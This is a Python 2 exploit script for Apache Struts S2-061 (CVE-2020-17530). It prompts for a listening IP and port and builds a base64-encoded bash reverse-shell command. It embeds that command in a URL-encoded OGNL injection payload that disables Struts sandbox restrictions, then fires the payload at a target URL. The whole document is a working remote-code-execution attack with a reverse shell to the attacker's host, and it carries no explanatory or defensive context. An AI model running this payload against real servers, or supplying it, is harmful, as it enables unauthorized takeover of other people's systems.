# encoding=utf-8
import requests
import sys
import base64
#import urllib.parse
import urllib

if len(sys.argv)!=2:
    print('+------------------------------------------------------------+')
    print('+      Use: python2 S2-061-shell.py http://1.1.1.1:8081      +')
    print('+                 VER: Struts 2.0.0-2.5.25                   +')
    print('+------------------------------------------------------------+')
    print('+                S2-061 RCE && CVE-2020-17530                +')
    print('+------------------------------------------------------------+')
    sys.exit()
# 填写监听ip及端口
ip = raw_input("Please input your listening ip:\n")
port = raw_input("Please input your listening port:\n")

# 对反弹shell命令进行编码
base_cmd = "bash -i >& /dev/tcp/"+str(ip)+"/"+str(port)+" 0>&1"
mid_cmd = base64.b64encode(base_cmd)
final_cmd = "{'bash -c {echo,"+mid_cmd+"}|{base64,-d}|{bash,-i}'}"
final_cmd=urllib.quote(final_cmd)

payload = "%25%7B%0A(%23request.map%3D%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2C0)%20%2B%20%0A(%23request.map.setBean(%23request.get('struts.valueStack'))%20%3D%3D%20true).toString().substring(0%2C0)%20%2B%20%0A(%23request.map2%3D%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2C0)%20%2B%0A(%23request.map2.setBean(%23request.get('map').get('context'))%20%3D%3D%20true).toString().substring(0%2C0)%20%2B%20%0A(%23request.map3%3D%23application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0%2C0)%20%2B%20%0A(%23request.map3.setBean(%23request.get('map2').get('memberAccess'))%20%3D%3D%20true).toString().substring(0%2C0)%20%2B%20%0A(%23request.get('map3').put('excludedPackageNames'%2C%23application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))%20%3D%3D%20true).toString().substring(0%2C0)%20%2B%20%0A(%23request.get('map3').put('excludedClasses'%2C%23application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet'))%20%3D%3D%20true).toString().substring(0%2C0)%20%2B%0A(%23application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec("+final_cmd+"))%0A%7D"

def exp(url):
    tturl=url+"/?id="+payload
    print(tturl)
    requests.get(tturl)

if __name__=='__main__':
    url=str(sys.argv[1])
    exp(url)
